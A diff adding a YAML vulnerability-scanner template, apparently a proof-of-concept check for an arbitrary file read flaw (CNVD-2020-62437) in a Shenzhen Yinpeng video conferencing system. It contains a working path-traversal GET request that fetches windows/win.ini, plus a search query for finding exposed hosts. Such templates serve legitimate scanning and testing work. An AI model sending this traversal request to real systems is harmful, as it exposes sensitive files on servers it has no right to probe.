@@ -1,0 +1,23 @@
+name: Yinpeng Hanming Video Conferencing  Arbitrary file read (CNVD-2020-62437)
+manual: true
+query: app="Hanming-Video-Conferencing"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"fonts")
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: |-
+    Shenzhen yinpeng cloud computing Co., Ltd. was established on September 11, 2013. Its business scope includes the development and sales of cloud computing technology, the design of computer software and hardware products, etc.
+
+
+
+    There is an arbitrary file download vulnerability in haoshitong video conference system of Shenzhen yinpeng cloud computing Co., Ltd., which can be used by attackers to obtain sensitive information.
+  tags: Disclosure of Sensitive Information
